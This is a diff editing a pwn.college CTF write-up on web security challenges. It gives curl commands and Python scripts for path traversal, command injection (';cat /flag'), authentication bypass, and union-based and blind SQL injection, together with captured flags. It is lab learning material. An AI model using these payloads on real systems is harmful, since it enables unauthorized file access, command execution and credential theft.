@@ -1,10 +1,6 @@
 Path Traversal 1:
-
 Commands used : 
 1. ` curl -v http://challenge.localhost:80/%2e%2e%2f%2e%2e%2fflag`
-
-DEBUG: requested_path='/challenge/files/../../flag'
-127.0.0.1 - - [15/Oct/2024 20:53:47] "GET /..%2f..%2fflag HTTP/1.1" 200 -
 
 Explanation : In this challenge we use to the path variable to go up the directories into the root and find the flag.
 Flag: `pwn.college{UI2oqiOm5jiajJ4ehv3RVJp_0V3.ddDOzMDL1kTM2czW}`
@@ -25,7 +21,6 @@ Flag: `pwn.college{UHe6gQw_rEP4UVqFJcubBFtoSju.dJjN1YDL1kTM2czW}`
 
 
 CMDi 1:
-
 Commands used : 
 1. `curl 'http://challenge.localhost?directory=;cat%20/flag'`
 
@@ -34,7 +29,6 @@ Flag: `pwn.college{cAuUyXk7Y1NGvoab2jgMx7Rc3T6.dVjN1YDL1kTM2czW}`
 
 
 CMDi 2:
-
 Commands used : 
 1. `curl 'http://challenge.localhost?directory=|cat%20/flag'`
 
@@ -43,7 +37,6 @@ Flag: `pwn.college{QQA_UaYFnQ4e2KJelXV6ie6yvqx.dRjN1YDL1kTM2czW}`
 
 
 CMDi 3:
-
 Commands used : 
 1. `curl 'http://challenge.localhost?directory=%27%3Bcat%20/flag%3B%27'`
 
@@ -52,7 +45,6 @@ Flag: `pwn.college{EJGVuGlDnp2yiBs-czJD-YtIS-b.dZjN1YDL1kTM2czW}`
 
 
 CMDi 4:
-
 Commands used : 
 1. `curl 'http://challenge.localhost?timezone=UTC%20date%3Bcat%20/flag%3b%20%23'`
 
@@ -77,14 +69,12 @@ Explanation : In this challenge, we will use a newline feed encodoing in the url
 Flag: `pwn.college{gKL4jQqaDkcUi2tVnZuVd9JjsPN.dRzN1YDL1kTM2czW}`
 
 
-
 Authentication Bypass 1:
 Commands used : 
 1. `curl http://challenge.localhost/?session_user=admin`
 
 Explanation : In the server code, in the get request if the session_user parameter is set to admin. it prints the flag.
 Flag: `pwn.college{olpGOV2ancJfRSInnzD6YniX03d.dlDOzMDL1kTM2czW}`
-
 
 
 Authentication Bypass 2:
@@ -100,14 +90,12 @@ Code used :
 import requests
 
 url = "http://challenge.localhost/"
-
 data = {
     'username': 'admin',
     'pin': '0 OR 1=1'
 }
 response = requests.post(url, data=data)
 print(response.text)
-
 
 Explanation : In the server code, it expects two form data parameters that are username and pin. we can see the structure of the query and see that no sanitization is provided for the input. so to login to the admin we can just use the above code.
 Flag: `pwn.college{87bda8wNXf6COvQOorHq9DdpIwi.dNzN1YDL1kTM2czW}`
@@ -118,7 +106,6 @@ Code used :
 import requests
 
 url = "http://challenge.localhost/"
-
 data = {
     'username': 'admin',
     'password': "0' OR '1'='1"
@@ -142,7 +129,6 @@ print(response.text)
 
 Explanation : We will join the data ub password column to the query using the UNION command.
 Flag: `pwn.college{s6XoLClv_OWLmlKMccpJyEZfqeK.dFTOzMDL1kTM2czW}`
-
 
 
 SQLi 4:
@@ -170,12 +156,10 @@ Explanation : the first query gives us the name of the table in the database. Us
 Flag: `pwn.college{cmc2muCyjNR21wmCGP-WJij5_hL.dJTOzMDL1kTM2czW}`
 
 
-
 SQLi 5:
 Code used : 
 1.
 import requests
-
 url = "http://challenge.localhost/"
 
 possible_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-={}[]|\\:;\'",.<>?/`~'
@@ -205,5 +189,5 @@ for i in range(1, max_length + 1):
 
 print(f"Recovered password: {password}")
 
-Explanation : In this challenge we wont be getting any useful output. we use substr command to check every character and find the correct one and appending it to the flag.
+Explanation : In this challenge we wont be getting any useful output. we use substr command to check every character and check whether the server is redirecting or not, and find the correct character and appending it to the flag.
 Flag: `pwn.college{cauPELBvOCYTLw9mCehR8ksENgj.dNTOzMDL1kTM2czW}`
